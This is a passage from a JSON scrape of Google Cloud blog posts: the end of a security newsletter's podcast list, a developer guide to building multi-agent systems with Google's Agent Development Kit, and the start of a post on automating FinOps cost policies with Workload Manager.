Chuvakin and Tim Peacock. <a href=\"https://cloud.withgoogle.com/cloudsecurity/podcast/ep249-data-first-what-really-makes-your-soc-ai-ready/\" target=\"_blank\"><b>Listen here</b></a>.</li><li><b>Cyber Savvy Boardroom: Valuing investment beyond the balance sheet</b>: Andreas Wuchner, cybersecurity and risk expert, and board advisor, shares his perspective on how smart investments can transform risk management into a brand promise. <a href=\"https://cybersavvyboardroom.libsyn.com/ep9-andreas-wuchner-on-beyond-the-balance-sheet-valuing-cyber-investment\" target=\"_blank\"><b>Listen here</b></a>.</li><li><b>Behind the Binary: Building a robust network at Black Hat</b>: Host Josh Stroschein is joined by Mark Overholser, a technical marketing engineer, Corelight, who also helps run the Black Hat Network Operations Center (NOC). He gives us an insider\u2019s look at the philosophy and challenges behind building a robust network for a security conference. <a href=\"https://www.youtube.com/watch?v=YNjEqSVZRPw&amp;list=PLjiTz6DAEpuLAykjYGpAUDL-tCrmTpXTf\" target=\"_blank\"><b>Listen here</b></a>.</li></ul><p>To have our Cloud CISO Perspectives post delivered twice a month to your inbox, <a href=\"https://cloud.google.com/resources/google-cloud-ciso-newsletter-signup\">sign up for our newsletter</a>. We\u2019ll be back in a few weeks with more security-related updates from Google Cloud.</p></div>",
        "published_date": "2025-11-05 14:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/topics/developers-practitioners/building-collaborative-ai-a-developers-guide-to-multi-agent-systems-with-adk/",
        "title": "Building Collaborative AI: A Developer's Guide to Multi-Agent Systems with ADK",
        "thumbnail": "https://storage.googleapis.com/gweb-cloudblog-publish/images/A_Developers_Guide_to_Multi-Agent_Systems_wi.max-600x600.png",
        "author": "Annie Wang",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">If you\u2019ve ever wondered how multiple AI agents can actually work together to solve problems too complex for a single agent, you're in the right place. This guide, based on our two-part video series, will walk you through the foundational concepts of </span><a href=\"https://google.github.io/adk-docs/agents/multi-agents/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Multi-Agent Systems (MAS)</span></a><span style=\"vertical-align: baseline;\"> and show you how </span><a href=\"https://google.github.io/adk-docs/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google\u2019s Agent Development Kit (ADK)</span></a><span style=\"vertical-align: baseline;\"> makes building them easier for developers.</span></p></div>\n<div class=\"block-video\">\n\n\n\n<div class=\"article-module article-video \">\n  <figure>\n    <a class=\"h-c-video h-c-video--marquee\" href=\"https://youtube.com/watch?v=pX0_iIfRilU\">\n\n      \n        <img alt=\"A YouTube video discussion the foundations of a multi-agent system\" src=\"https://img.youtube.com/vi/pX0_iIfRilU/maxresdefault.jpg\" />\n      \n      <svg class=\"h-c-video__play h-c-icon h-c-icon--color-white\" xmlns=\"http://www.w3.org/2000/svg\">\n        <use xlink:href=\"#mi-youtube-icon\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"></use>\n      </svg>\n    </a>\n\n    \n  </figure>\n</div>\n\n<div class=\"h-c-modal--video\">\n   <a class=\"glue-yt-video\" href=\"https://youtube.com/watch?v=pX0_iIfRilU\">\n   </a>\n</div>\n\n</div>\n<div class=\"block-video\">\n\n\n\n<div class=\"article-module article-video \">\n  <figure>\n    <a class=\"h-c-video h-c-video--marquee\" href=\"https://youtube.com/watch?v=WfJcCeLZD2I\">\n\n      \n        <img alt=\"A YouTube video explaining workflow agents and communication\" src=\"https://img.youtube.com/vi/WfJcCeLZD2I/maxresdefault.jpg\" />\n      \n      <svg class=\"h-c-video__play h-c-icon h-c-icon--color-white\" xmlns=\"http://www.w3.org/2000/svg\">\n        <use xlink:href=\"#mi-youtube-icon\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"></use>\n      </svg>\n    </a>\n\n    \n  </figure>\n</div>\n\n<div class=\"h-c-modal--video\">\n   <a class=\"glue-yt-video\" href=\"https://youtube.com/watch?v=WfJcCeLZD2I\">\n   </a>\n</div>\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">By the end of this post, you\u2019ll understand what multi-agent systems are, how to structure them, and how to enable communication between your agents using </span><a href=\"https://google.github.io/adk-docs/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">ADK</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n<p><span style=\"vertical-align: baseline;\">Let's dive in.</span></p>\n<h2><span style=\"vertical-align: baseline;\">What Is a Multi-Agent System?</span></h2>\n<p><span style=\"vertical-align: baseline;\">At its core, a <strong>multi-agent system</strong> is a collection of individual, autonomous agents that collaborate to achieve a goal. To truly grasp this, let's break it down into three key ideas:</span></p>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">Decentralized Control</strong><span style=\"vertical-align: baseline;\">: There\u2019s no single \u201cboss\u201d agent controlling everything. Each agent makes its own decisions based on its own rules and local information. Think of a flock of birds swirling in the sky, there's no leader, but together they form incredible, coordinated patterns.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Local Views</strong><span style=\"vertical-align: baseline;\">: Each agent only has a partial view of the system. It perceives and reacts to its immediate environment, not the entire system state. Imagine standing in a crowded stadium; you only see and react to the people directly around you, not the entire crowd simultaneously.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Emergent Behavior</strong><span style=\"vertical-align: baseline;\">: This is where the magic happens. From these simple, local interactions, complex and intelligent global behaviors emerge. Agents working together in this way can solve tasks that no single agent could easily accomplish alone.</span></li>\n</ul></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"8\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/8_bSozdwl.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">This collaborative approach allows for robust, scalable, and flexible solutions to complex problems.</span></p>\n<h2><span style=\"vertical-align: baseline;\">How ADK Supports Multi-Agent Systems</span></h2>\n<p><a href=\"https://google.github.io/adk-docs/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google\u2019s Agent Development Kit (ADK)</span></a><span style=\"vertical-align: baseline;\"> was built from the ground up with multi-agent systems in mind. Instead of forcing you to hack different components together, it provides a structured framework with three primary types of agents, each with a specific role:</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"7\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/7_fe519aX.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><ul>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://google.github.io/adk-docs/agents/llm-agents/\" rel=\"noopener\" target=\"_blank\"><strong style=\"vertical-align: baseline;\">LLM Agents</strong></a><span style=\"vertical-align: baseline;\">: These are the \u201cbrains\u201d of the operation. They leverage large language models like Gemini to understand natural language input, reason through problems, and decide on the next course of action.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://google.github.io/adk-docs/agents/workflow-agents/\" rel=\"noopener\" target=\"_blank\"><strong style=\"vertical-align: baseline;\">Workflow Agents</strong></a><span style=\"vertical-align: baseline;\">: These are the \u201cmanagers\u201d that orchestrate how tasks get done. They don\u2019t perform the work themselves but instead direct the flow of execution among other agents. We'll explore these in detail later.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://google.github.io/adk-docs/agents/custom-agents/\" rel=\"noopener\" target=\"_blank\"><strong style=\"vertical-align: baseline;\">Custom Agents</strong></a><span style=\"vertical-align: baseline;\">: These are the \u201cspecialists.\u201d When you need full control or specific logic that doesn\u2019t fit the other agent types, you can write your own Python code by inheriting from </span><code style=\"vertical-align: baseline;\">BaseAgent</code><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n</ul>\n<h3><span style=\"vertical-align: baseline;\">The Foundational Concept: Agent Hierarchy</span></h3>\n<p><span style=\"vertical-align: baseline;\">When you build with ADK, agents are organized into a hierarchy, much like a company's organizational chart. This structure is the backbone of your system and is governed by two simple rules:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Parent &amp; Sub-Agents</strong><span style=\"vertical-align: baseline;\">: A parent agent can manage one or more sub-agents, delegating tasks to them.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Single Parent Rule</strong><span style=\"vertical-align: baseline;\">: Each agent can have only one parent, ensuring a clear line of command and data flow.</span></p>\n</li>\n</ul></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"mutliagent_blog_visual (2)\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/mutliagent_blog_visual_2.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Think of it like this: the </span><strong style=\"vertical-align: baseline;\">root agent</strong><span style=\"vertical-align: baseline;\"> is the CEO, who oversees the entire operation. Its </span><strong style=\"vertical-align: baseline;\">sub-agents</strong><span style=\"vertical-align: baseline;\"> might be VPs, who in turn manage directors, managers, and individual contributors. Everyone has a defined role, and together they accomplish the company's mission. See example <a href=\"https://github.com/cuppibla/adk_tutorial/blob/main/d_routing_agent/agents.py\" rel=\"noopener\" target=\"_blank\">here</a>.</span></p>\n<p><span style=\"vertical-align: baseline;\">This hierarchical structure is fundamental to organizing and scaling your multi-agent system.</span></p>\n<h2><span style=\"vertical-align: baseline;\">Orchestrating Tasks with Workflow Agents</span></h2>\n<p><span style=\"vertical-align: baseline;\">So, we have a hierarchy. But how do we control the </span><span style=\"font-style: italic; vertical-align: baseline;\">flow</span><span style=\"vertical-align: baseline;\"> of work within that structure? This is where Workflow Agents shine. ADK provides three pre-built orchestrators to manage sub-agents:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://google.github.io/adk-docs/agents/workflow-agents/sequential-agents/\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">SequentialAgent</strong></a><span style=\"vertical-align: baseline;\">: This agent functions like an assembly line. It runs its sub-agents one after another, in a predefined order. The output of one agent can be passed as the input to the next, making it perfect for multi-step pipelines like: </span><code style=\"vertical-align: baseline;\">fetch data \u2192 clean data \u2192 analyze data \u2192 summarize findings</code><span style=\"vertical-align: baseline;\">. See example <a href=\"https://github.com/cuppibla/adk_tutorial/blob/main/b1_sequential_agent/agents.py\" rel=\"noopener\" target=\"_blank\">here</a>.</span></p>\n</li>\n</ul></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"mutliagent_blog_visual (6)\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/mutliagent_blog_visual_6.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><ul>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://google.github.io/adk-docs/agents/workflow-agents/parallel-agents/\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">ParallelAgent</strong></a><span style=\"vertical-align: baseline;\">: This agent acts like a manager assigning tasks to multiple employees at once. It runs all its sub-agents concurrently, which is ideal for independent tasks that can be performed simultaneously, such as calling three different APIs to gather information. See example <a href=\"https://github.com/cuppibla/adk_tutorial/blob/main/b2_parallel_agent/agents.py\" rel=\"noopener\" target=\"_blank\">here</a>.</span></p>\n</li>\n</ul></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"mutliagent_blog_visual (7)\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/mutliagent_blog_visual_7.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><ul>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://google.github.io/adk-docs/agents/workflow-agents/loop-agents/\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">LoopAgent</strong></a><span style=\"vertical-align: baseline;\">: This agent works like a </span><code style=\"vertical-align: baseline;\">while</code><span style=\"vertical-align: baseline;\"> loop in programming. It repeatedly executes its sub-agents until a specific condition is met or a maximum number of iterations is reached. This is useful for tasks like polling an API for a status update or retrying an operation until it succeeds. See example <a href=\"https://github.com/cuppibla/adk_tutorial/blob/main/b3_loop_agent/agents.py\" rel=\"noopener\" target=\"_blank\">here</a>.</span></p>\n</li>\n</ul></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"6\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/6_zyKwPKJ.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Using these workflow agents, you can build complex and dynamic execution paths without getting lost in boilerplate code.</span></p>\n<h2><span style=\"vertical-align: baseline;\">How Do Agents Communicate?</span></h2>\n<p><span style=\"vertical-align: baseline;\">We have our structure and our managers. The final piece of the puzzle is communication. How do agents actually share information and delegate work? ADK provides three primary communication mechanisms.</span></p>\n<h3>Shared Session State</h3>\n<p><strong style=\"vertical-align: baseline;\">Shared Session State </strong>is like a<span style=\"vertical-align: baseline;\">\u00a0shared digital whiteboard. An agent can write its result to a common </span><code style=\"vertical-align: baseline;\">state</code><span style=\"vertical-align: baseline;\"> object, and other agents in the hierarchy can read that information to inform their own actions. For example, an </span><code style=\"vertical-align: baseline;\">LLMAgent</code><span style=\"vertical-align: baseline;\"> can analyze user input and save the key entities to the state, allowing a </span><code style=\"vertical-align: baseline;\">CustomAgent</code><span style=\"vertical-align: baseline;\"> to then use those entities to query a database.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"mutliagent_blog_visual (9)\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/mutliagent_blog_visual_9.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">LLM-Driven Delegation</span></h3>\n<p><strong style=\"vertical-align: baseline;\">LLM-Driven Delegation </strong><span style=\"vertical-align: baseline;\">is a more dynamic and intelligent form of communication. A parent agent (often an </span><code style=\"vertical-align: baseline;\">LLMAgent</code><span style=\"vertical-align: baseline;\">) can act as a coordinator. It analyzes the incoming request and uses its reasoning capabilities to decide which of its sub-agents is best suited to handle the task. For instance, if a user asks to \"generate an invoice for last month,\" the coordinator agent can dynamically route the request to a specialized </span><code style=\"vertical-align: baseline;\">BillingAgent</code><span style=\"vertical-align: baseline;\">.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"mutliagent_blog_visual (10)\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/mutliagent_blog_visual_10.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Explicit Invocation (AgentTool)</span></h3>\n<p><strong style=\"vertical-align: baseline;\">Explicit Invocation (AgentTool) </strong>describes a pattern where<span style=\"vertical-align: baseline;\">\u00a0one agent can directly call another agent as if it were a function. This is achieved by wrapping the target agent as a \"tool\" that the parent agent can choose to invoke. For example, a primary analysis agent might call a </span><code style=\"vertical-align: baseline;\">CalculatorAgent</code><span style=\"vertical-align: baseline;\"> tool whenever it encounters a task requiring precise mathematical calculations.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"mutliagent_blog_visual (11)\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/mutliagent_blog_visual_11.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">It's important to understand the distinction between a sub-agent and an AgentTool:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">A </span><strong style=\"vertical-align: baseline;\">Sub-Agent</strong><span style=\"vertical-align: baseline;\"> is a permanent part of the hierarchy\u2014an employee on the org chart, always managed by its parent.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">An </span><strong style=\"vertical-align: baseline;\">AgentTool</strong><span style=\"vertical-align: baseline;\"> is like an external consultant. You call on them when you need their specific expertise, but they aren't part of your core team structure.</span></p>\n</li>\n</ul></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"mutliagent_blog_visual (12)\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/mutliagent_blog_visual_12.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h2><span style=\"vertical-align: baseline;\">Wrapping up</span></h2>\n<p><span style=\"vertical-align: baseline;\">Let\u2019s quickly recap what we've covered:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Multi-Agent Systems</strong><span style=\"vertical-align: baseline;\"> are powerful because they use decentralized control and local views to produce complex, emergent behaviors.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">ADK</strong><span style=\"vertical-align: baseline;\"> provides a robust framework with three agent categories: </span><strong style=\"vertical-align: baseline;\">LLM</strong><span style=\"vertical-align: baseline;\"> (brains), </span><strong style=\"vertical-align: baseline;\">Workflow</strong><span style=\"vertical-align: baseline;\"> (managers), and </span><strong style=\"vertical-align: baseline;\">Custom</strong><span style=\"vertical-align: baseline;\"> (specialists).</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Agent Hierarchy</strong><span style=\"vertical-align: baseline;\"> provides the organizational structure for your system, defining clear parent-child relationships.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Workflow Agents</strong><span style=\"vertical-align: baseline;\"> (</span><code style=\"vertical-align: baseline;\">Sequential</code><span style=\"vertical-align: baseline;\">, </span><code style=\"vertical-align: baseline;\">Parallel</code><span style=\"vertical-align: baseline;\">, </span><code style=\"vertical-align: baseline;\">Loop</code><span style=\"vertical-align: baseline;\">) give you the patterns to orchestrate complex task flows.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Communication Mechanisms</strong><span style=\"vertical-align: baseline;\"> (</span><strong style=\"vertical-align: baseline;\">Shared State</strong><span style=\"vertical-align: baseline;\">, </span><strong style=\"vertical-align: baseline;\">Delegation</strong><span style=\"vertical-align: baseline;\">, and </span><strong style=\"vertical-align: baseline;\">Explicit Invocation</strong><span style=\"vertical-align: baseline;\">) allow your agents to collaborate effectively.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Together, these concepts make your multi-agent systems not just structured, but truly collaborative, flexible, and intelligent. Now you have the foundational knowledge to start building your own multi-agent applications with ADK. You can start coding the following tutorial </span><a href=\"https://codelabs.developers.google.com/onramp/instructions#1\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">here</span></a><span style=\"vertical-align: baseline;\">!</span></p>\n<h2><span style=\"vertical-align: baseline;\">Resources</span></h2>\n<p><span style=\"vertical-align: baseline;\">ADK Doc: </span><a href=\"https://google.github.io/adk-docs/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">https://google.github.io/adk-docs/</span></a><span style=\"vertical-align: baseline;\">\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">ADK Sample: </span><a href=\"https://github.com/google/adk-samples\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">https://github.com/google/adk-samples</span></a><span style=\"vertical-align: baseline;\"> </span></p>\n<p><span style=\"vertical-align: baseline;\">ADK Codelab: </span><a href=\"https://codelabs.developers.google.com/onramp/instructions#0\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">https://codelabs.developers.google.com/onramp/instructions#0</span></a><span style=\"vertical-align: baseline;\">\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">ADK Multiagent Examples: </span><a href=\"https://github.com/cuppibla/adk_tutorial/tree/main\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">https://github.com/cuppibla/adk_tutorial/tree/main</span></a></p>\n<h2><span style=\"vertical-align: baseline;\">Connect with me</span></h2>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Annie Wang \u2192 </span><a href=\"https://www.linkedin.com/in/anniewangtech/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">LinkedIn</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://x.com/anniewangtech\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">X</span></a></p>\n</li>\n</ul></div>",
        "published_date": "2025-11-05 08:33:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/topics/cost-management/automate-financial-governance-policies-using-workload-manager/",
        "title": "Automating FinOps cost management policies using Workload Manager",
        "thumbnail": null,
        "author": "Omkar Suram",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Do you find yourself battling surprise cloud bills? Do you spend more time tracking down un-tagged resources and chasing development teams than you do on strategic financial planning? In the fast-paced world of cloud, manual cost management is a losing game. It\u2019s time-consuming, prone to errors, and often, by the time you\u2019ve identified a cost anomaly, it's too late to prevent the impact.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">What if you could codify your financial governance policies and automate their enforcement across your entire Google Cloud organization? Enter Workload Manager (WLM), a powerful tool that lets you automate the validation of your cloud workloads against best practices for security and compliance, including your own custom-defined FinOps rules. Better yet, we recently slashed the cost of using Workload Manager by up to 95% for certain scenarios, letting you run large-scale scans more economically, including a small free tier to help you run small-scale tests. In this blog, we show you how to get started with automated financial governance policies in Workload Manager, so you can stop playing catch-up and start proactively managing your cloud spend.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">The challenge with manual FinOps</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Managing business-critical workloads in the cloud is complex. Staying on top of cost-control best practices is a significant and time-consuming effort. Manual reviews and audits can take weeks or even months to complete, by which time costs can spiral. This manual approach often leads to \"configuration drift,\" where systems deviate from your established cost management policies, making it difficult to detect and control spending.</span></p>\n<p><span style=\"vertical-align: baseline;\">Workload Manager helps you break free from these manual constraints by providing a framework for automated, continuous validation, helping FinOps teams to:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Improve standardization:</strong><span style=\"vertical-align: baseline;\"> Decouple team dependencies and drive consistent application of cost-control policies across the organization.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Enable ownership:</strong><span style=\"vertical-align: baseline;\"> Empower individual teams to build and manage their own detection rules for specific use cases, fostering a culture of financial accountability.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Simplify auditing:</strong><span style=\"vertical-align: baseline;\"> Easily run infrastructure checks across your entire organization and consolidate the findings into a single BigQuery dataset for streamlined reporting and analysis.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">By codifying your FinOps policies, you can define them once and run continuous scans to detect violations across your entire cloud environment on a regular schedule.</span></p>\n<p><span style=\"vertical-align: baseline;\">Workload Manager makes this easy, providing you with out-of-the-box rules across Security, Cost, Reliability etc. Here are some examples of FinOps cost management policies that can be automated with Workload Manager:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Must have required label or tag for a specific google cloud resource (eg: BigQuery dataset)</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Enforce lifecycle management or autoclass configuration for every cloud storage bucket</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Ensure appropriate data retention is set for storage (eg: BigQuery tables)</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Disable simultaneous multi-threading to optimize licensing costs (eg: SQL Server)</span></p>\n</li>\n</ul></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Figure - 1\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/Figure_-_1.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure - 1: Default Workload Manager policies as per Google Cloud best practices</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Don't find what you need? You can always build your own custom policies using examples in our Git repo.</span></p>\n<p><span style=\"vertical-align: baseline;\">Let\u2019s take a closer look.\u00a0</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Automating FinOps policies: A step-by-step guide</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Here\u2019s how you can use Workload Manager to automate your cost management policies.</span></p>\n<p><strong style=\"vertical-align: baseline;\">Step 1: Define your FinOps rules and create a new evaluation</strong></p>\n<p><span style=\"vertical-align: baseline;\">First, you need to translate your cost management policies into a format that the Workload Manager can understand. The tool uses Open Policy Agent (OPA) Rego for defining custom rules. In this blog we will take a primary use case for FinOps \u2014 that is, to ensure resources are properly labeled for cost allocation and showback.</span></p>\n<p><span style=\"vertical-align: baseline;\">You can choose from hundreds of </span><a href=\"https://cloud.google.com/workload-manager/docs/reference/best-practices-general\"><span style=\"text-decoration: underline; vertical-align: baseline;\">predefined rules</span></a><span style=\"vertical-align: baseline;\"> authored by Google Cloud experts that cover FinOps, reliability, security, and operations according to the Google Cloud best practices or create and customize your own rules (checkout examples from the </span><a href=\"https://github.com/GoogleCloudPlatform/workload-manager/tree/main/rules\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Cloud GitHub 